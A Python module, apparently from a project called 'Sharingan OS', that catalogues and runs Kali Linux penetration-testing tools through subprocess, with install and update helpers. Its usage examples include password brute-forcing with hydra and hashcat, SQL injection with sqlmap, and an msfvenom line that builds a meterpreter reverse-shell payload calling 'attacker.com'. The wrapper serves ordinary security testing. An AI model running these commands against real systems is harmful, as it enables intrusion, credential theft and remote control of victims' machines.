#!/usr/bin/env python3
"""
Sharingan OS - Kali Linux Integration Wrappers
Intégration transparente des outils Kali Linux
Auteur: Ben Sambe
"""

import subprocess
import os
import sys
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
import logging
import json

logger = logging.getLogger("sharingan.kali")

@dataclass
class KaliTool:
    """Informations sur un outil Kali"""
    name: str
    description: str
    category: str
    command: str
    requires_root: bool = False
    package_name: str = ""
    dependencies: Optional[List[str]] = None
    usage_examples: Optional[List[str]] = None

    def __post_init__(self):
        if self.dependencies is None:
            self.dependencies = []
        if self.usage_examples is None:
            self.usage_examples = []

class KaliToolsManager:
    """
    Gestionnaire d'intégration des outils Kali Linux.
    Fournit des wrappers sécurisés et faciles à utiliser.
    """

    def __init__(self):
        self.base_dir = Path(__file__).parent
        self.is_kali = self._check_kali_environment()
        self.tools = self._initialize_tools()
        self.is_active = False

    def _check_kali_environment(self) -> bool:
        """Vérifie si on est sur Kali Linux"""
        try:
            # Check for Kali-specific files
            kali_files = [
                "/etc/os-release",  # Check for Kali ID
                "/usr/bin/nmap",    # Core Kali tool
                "/usr/bin/metasploit-framework"
            ]

            # Check /etc/os-release for Kali
            if Path("/etc/os-release").exists():
                with open("/etc/os-release", "r") as f:
                    content = f.read()
                    if 'ID=kali' in content or 'PRETTY_NAME="Kali GNU/Linux"' in content:
                        return True

            # Check for Kali tools
            for tool in ["/usr/bin/nmap", "/usr/bin/metasploit-framework"]:
                if Path(tool).exists():
                    return True

            return False

        except Exception as e:
            logger.warning(f"Error checking Kali environment: {e}")
            return False

    def _initialize_tools(self) -> Dict[str, KaliTool]:
        """Initialise la liste des outils Kali supportés"""
        tools = {}

        # NETWORKING TOOLS
        tools["nmap"] = KaliTool(
            name="nmap",
            description="Network Mapper - Port scanner",
            category="networking",
            command="nmap",
            package_name="nmap",
            usage_examples=[
                "nmap -sV -p- target.com",
                "nmap -A -T4 target.com",
                "nmap --script=vuln target.com"
            ]
        )

        tools["masscan"] = KaliTool(
            name="masscan",
            description="Mass IP port scanner",
            category="networking",
            command="masscan",
            package_name="masscan",
            usage_examples=[
                "masscan -p1-65535 target.com --rate=1000",
                "masscan -p80,443 target.com"
            ]
        )

        tools["netdiscover"] = KaliTool(
            name="netdiscover",
            description="Active/passive network address reconnaissance",
            category="networking",
            command="netdiscover",
            package_name="netdiscover",
            usage_examples=[
                "netdiscover -r 192.168.1.0/24",
                "netdiscover -p"
            ]
        )

        # WEB APPLICATION TOOLS
        tools["nikto"] = KaliTool(
            name="nikto",
            description="Web server scanner",
            category="web",
            command="nikto",
            package_name="nikto",
            usage_examples=[
                "nikto -h http://target.com",
                "nikto -h target.com -p 80,443"
            ]
        )

        tools["dirb"] = KaliTool(
            name="dirb",
            description="Web content scanner",
            category="web",
            command="dirb",
            package_name="dirb",
            usage_examples=[
                "dirb http://target.com",
                "dirb http://target.com /usr/share/wordlists/dirb/common.txt"
            ]
        )

        tools["dirsearch"] = KaliTool(
            name="dirsearch",
            description="Web path discovery",
            category="web",
            command="dirsearch",
            package_name="dirsearch",
            usage_examples=[
                "dirsearch -u http://target.com",
                "dirsearch -u http://target.com -w /usr/share/wordlists/dirb/common.txt"
            ]
        )

        tools["gobuster"] = KaliTool(
            name="gobuster",
            description="Directory/file/dns busting tool",
            category="web",
            command="gobuster",
            package_name="gobuster",
            usage_examples=[
                "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt",
                "gobuster dns -d domain.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt"
            ]
        )

        tools["ffuf"] = KaliTool(
            name="ffuf",
            description="Fast web fuzzer",
            category="web",
            command="ffuf",
            package_name="ffuf",
            usage_examples=[
                "ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt",
                "ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200"
            ]
        )

        tools["wpscan"] = KaliTool(
            name="wpscan",
            description="WordPress vulnerability scanner",
            category="web",
            command="wpscan",
            package_name="wpscan",
            usage_examples=[
                "wpscan --url http://wordpress-site.com",
                "wpscan --url http://wordpress-site.com --enumerate u"
            ]
        )

        # PASSWORD TOOLS
        tools["hashcat"] = KaliTool(
            name="hashcat",
            description="Advanced password recovery",
            category="password",
            command="hashcat",
            package_name="hashcat",
            usage_examples=[
                "hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a",
                "hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt"
            ]
        )

        tools["john"] = KaliTool(
            name="john",
            description="John the Ripper password cracker",
            category="password",
            command="john",
            package_name="john",
            usage_examples=[
                "john hash.txt",
                "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
            ]
        )

        tools["hydra"] = KaliTool(
            name="hydra",
            description="Network login cracker",
            category="password",
            command="hydra",
            package_name="hydra",
            usage_examples=[
                "hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form \"/login:username=^USER^&password=^PASS^:F=invalid\"",
                "hydra -l user -P passlist.txt ftp://target.com"
            ]
        )

        # WIRELESS TOOLS
        tools["aircrack-ng"] = KaliTool(
            name="aircrack-ng",
            description="Wireless network auditor",
            category="wireless",
            command="aircrack-ng",
            package_name="aircrack-ng",
            usage_examples=[
                "airodump-ng wlan0",
                "aircrack-ng -w wordlist.cap capture.cap"
            ]
        )

        # EXPLOITATION TOOLS
        tools["metasploit"] = KaliTool(
            name="metasploit",
            description="Metasploit Framework",
            category="exploitation",
            command="msfconsole",
            package_name="metasploit-framework",
            usage_examples=[
                "msfconsole",
                "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f exe > payload.exe"
            ]
        )

        tools["sqlmap"] = KaliTool(
            name="sqlmap",
            description="SQL injection tool",
            category="exploitation",
            command="sqlmap",
            package_name="sqlmap",
            usage_examples=[
                "sqlmap -u 'http://target.com/vuln.php?id=1'",
                "sqlmap -u 'http://target.com/vuln.php?id=1' --dbs"
            ]
        )

        # FORENSIC TOOLS
        tools["binwalk"] = KaliTool(
            name="binwalk",
            description="Firmware analysis tool",
            category="forensic",
            command="binwalk",
            package_name="binwalk",
            usage_examples=[
                "binwalk firmware.bin",
                "binwalk -e firmware.bin"
            ]
        )

        tools["foremost"] = KaliTool(
            name="foremost",
            description="File carving tool",
            category="forensic",
            command="foremost",
            package_name="foremost",
            usage_examples=[
                "foremost -i image.dd -o output/",
                "foremost -i image.dd -t jpg,png,gif -o output/"
            ]
        )

        tools["volatility"] = KaliTool(
            name="volatility",
            description="Memory forensics framework",
            category="forensic",
            command="volatility",
            package_name="volatility",
            requires_root=True,
            usage_examples=[
                "volatility -f memory.dump imageinfo",
                "volatility -f memory.dump --profile=Win7SP1x64 pslist"
            ]
        )

        # ENUMERATION TOOLS
        tools["theharvester"] = KaliTool(
            name="theharvester",
            description="Email, domain and IP harvesting",
            category="enumeration",
            command="theharvester",
            package_name="theharvester",
            usage_examples=[
                "theharvester -d domain.com -l 500 -b google",
                "theharvester -d domain.com -b all"
            ]
        )

        tools["dnsrecon"] = KaliTool(
            name="dnsrecon",
            description="DNS enumeration tool",
            category="enumeration",
            command="dnsrecon",
            package_name="dnsrecon",
            usage_examples=[
                "dnsrecon -d domain.com",
                "dnsrecon -d domain.com -t axfr"
            ]
        )

        # SOCIAL ENGINEERING
        tools["setoolkit"] = KaliTool(
            name="setoolkit",
            description="Social-Engineer Toolkit",
            category="social",
            command="setoolkit",
            package_name="setoolkit",
            usage_examples=[
                "setoolkit",
                "setoolkit --help"
            ]
        )

        return tools

    def start(self):
        """Démarre l'intégration Kali"""
        logger.info("Starting Kali Tools integration...")

        if not self.is_kali:
            logger.warning("Not running on Kali Linux - some tools may not be available")
            self.is_active = True
            return

        # Vérifier les outils installés
        available_tools = []
        missing_tools = []

        for name, tool in self.tools.items():
            if self._is_tool_available(tool.command):
                available_tools.append(name)
            else:
                missing_tools.append(name)

        logger.info(f"Kali integration ready: {len(available_tools)} tools available")
        if missing_tools:
            logger.info(f"Missing tools: {', '.join(missing_tools[:5])}...")

        self.is_active = True

    def stop(self):
        """Arrête l'intégration Kali"""
        logger.info("Stopping Kali Tools integration...")
        self.is_active = False

    def _is_tool_available(self, command: str) -> bool:
        """Vérifie si un outil est disponible"""
        try:
            result = subprocess.run(
                ["which", command],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.returncode == 0
        except:
            return False

    def run_tool(self, tool_name: str, args: List[str] = None, timeout: int = 300) -> Dict[str, Any]:
        """
        Exécute un outil Kali de manière sécurisée

        Args:
            tool_name: Nom de l'outil
            args: Arguments à passer
            timeout: Timeout en secondes

        Returns:
            Dict avec stdout, stderr, returncode
        """
        if not self.is_active:
            return {"error": "Kali integration not active"}

        if tool_name not in self.tools:
            return {"error": f"Unknown tool: {tool_name}"}

        tool = self.tools[tool_name]

        # Vérifier si l'outil est disponible
        if not self._is_tool_available(tool.command):
            return {"error": f"Tool not available: {tool_name}"}

        # Construire la commande
        cmd = [tool.command]
        if args:
            cmd.extend(args)

        logger.info(f"Running Kali tool: {' '.join(cmd)}")

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )

            return {
                "success": result.returncode == 0,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode,
                "command": " ".join(cmd)
            }

        except subprocess.TimeoutExpired:
            return {"error": f"Tool timeout after {timeout}s", "timeout": True}
        except Exception as e:
            return {"error": str(e)}

    def get_available_tools(self) -> List[str]:
        """Retourne la liste des outils disponibles"""
        available = []
        for name, tool in self.tools.items():
            if self._is_tool_available(tool.command):
                available.append(name)
        return available

    def get_tool_info(self, tool_name: str) -> Optional[Dict[str, Any]]:
        """Retourne les informations sur un outil"""
        if tool_name not in self.tools:
            return None

        tool = self.tools[tool_name]
        return {
            "name": tool.name,
            "description": tool.description,
            "category": tool.category,
            "command": tool.command,
            "requires_root": tool.requires_root,
            "package_name": tool.package_name,
            "available": self._is_tool_available(tool.command),
            "usage_examples": tool.usage_examples
        }

    def get_tools_by_category(self, category: str) -> List[str]:
        """Retourne les outils d'une catégorie"""
        return [name for name, tool in self.tools.items() if tool.category == category]

    def install_tool(self, tool_name: str) -> Dict[str, Any]:
        """Installe un outil Kali"""
        if tool_name not in self.tools:
            return {"error": f"Unknown tool: {tool_name}"}

        tool = self.tools[tool_name]

        if not tool.package_name:
            return {"error": f"No package name for tool: {tool_name}"}

        try:
            cmd = ["apt", "update"]
            subprocess.run(cmd, check=True)

            cmd = ["apt", "install", "-y", tool.package_name]
            result = subprocess.run(cmd, capture_output=True, text=True)

            if result.returncode == 0:
                return {"success": True, "message": f"Tool {tool_name} installed"}
            else:
                return {"error": f"Installation failed: {result.stderr}"}

        except Exception as e:
            return {"error": str(e)}

    def update_kali_tools(self) -> Dict[str, Any]:
        """Met à jour tous les outils Kali"""
        try:
            logger.info("Updating Kali tools...")

            # Update package list
            subprocess.run(["apt", "update"], check=True)

            # Upgrade all packages
            result = subprocess.run(
                ["apt", "upgrade", "-y"],
                capture_output=True,
                text=True
            )

            if result.returncode == 0:
                return {"success": True, "message": "Kali tools updated successfully"}
            else:
                return {"error": f"Update failed: {result.stderr}"}

        except Exception as e:
            return {"error": str(e)}

def get_kali_tools_manager() -> KaliToolsManager:
    """Get Kali tools manager instance"""
    return KaliToolsManager()

if __name__ == "__main__":
    print("🔥 Sharingan OS - Kali Linux Integration")
    print("=" * 50)

    manager = KaliToolsManager()

    print(f"Kali Linux detected: {manager.is_kali}")
    print(f"Available tools: {len(manager.get_available_tools())}")

    # Démarrer l'intégration
    manager.start()

    # Lister les outils par catégorie
    categories = ["networking", "web", "password", "wireless", "exploitation", "forensic", "enumeration"]

    for category in categories:
        tools = manager.get_tools_by_category(category)
        if tools:
            print(f"\n{category.upper()}:")
            for tool in tools:
                available = "✓" if manager._is_tool_available(manager.tools[tool].command) else "✗"
                print(f"  {available} {tool}")

    print("\n💡 Utilisation:")
    print("  from kali_wrappers import get_kali_tools_manager")
    print("  kali = get_kali_tools_manager()")
    print("  kali.run_tool('nmap', ['-sV', 'target.com'])")